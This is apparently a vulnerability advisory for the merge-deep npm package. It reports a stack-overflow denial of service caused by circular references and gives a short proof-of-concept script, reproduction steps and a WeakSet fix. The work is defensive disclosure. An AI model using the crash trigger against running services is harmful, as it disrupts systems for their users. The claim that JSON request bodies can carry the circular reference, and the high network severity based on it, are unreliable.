# Security Vulnerability: Denial of Service via Circular Reference

## Summary
merge-deep is vulnerable to a Denial of Service (DoS) attack when processing objects with circular references, causing stack overflow and application crash.

## Severity
**High** - CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

## Affected Versions
- merge-deep <= 3.0.3 (current latest)

## Vulnerability Details

The `merge()` function does not detect circular references in input objects. When merging an object that references itself, the function enters infinite recursion until the call stack is exhausted.

### Root Cause
In `index.js` lines 33-51, the merge function recursively processes nested objects without tracking visited objects:

```javascript
function merge(target, obj) {
  for (var key in obj) {
    // ... no circular reference detection
    if (isObject(val) && isObject(target[key])) {
      target[key] = merge(target[key], val); // Infinite recursion here
    }
  }
}
```

## Proof of Concept

```javascript
const merge = require('merge-deep');

// Create object with circular reference
const malicious = { name: 'test' };
malicious.self = malicious;

// Triggers stack overflow
merge({}, malicious);
// RangeError: Maximum call stack size exceeded
```

## Impact

1. **Application Crash**: Any application using merge-deep with untrusted input can be crashed
2. **Service Disruption**: Web servers accepting JSON payloads are vulnerable
3. **Remote Exploitation**: Attackers can trigger this via API endpoints

### Real-world Attack Scenario

```javascript
// Vulnerable Express.js endpoint
app.post('/api/config', (req, res) => {
  const config = merge({}, defaultConfig, req.body);
  // Server crashes if req.body contains circular reference
});
```

## Reproduction Steps

1. Clone the repository
2. Run `npm install`
3. Create test file with PoC code above
4. Execute: `node test.js`
5. Observe: `RangeError: Maximum call stack size exceeded`

## Recommended Fix

Add circular reference detection using WeakSet:

```javascript
function merge(target, obj, seen = new WeakSet()) {
  if (seen.has(obj)) {
    return target; // Circular reference detected
  }
  seen.add(obj);

  for (var key in obj) {
    if (!isValidKey(key) || !hasOwn(obj, key)) {
      continue;
    }

    var val = obj[key];
    if (isObject(val) && isObject(target[key])) {
      target[key] = merge(target[key], val, seen);
    } else {
      target[key] = clone(val, target[key], seen);
    }
  }
  return target;
}
```

## References
- CWE-674: Uncontrolled Recursion
- Similar vulnerabilities: lodash merge, jQuery extend

## Timeline
- **2026-03-15**: Vulnerability discovered
- **2026-03-15**: Issue reported

## Credit
Security Researcher: yeee3642
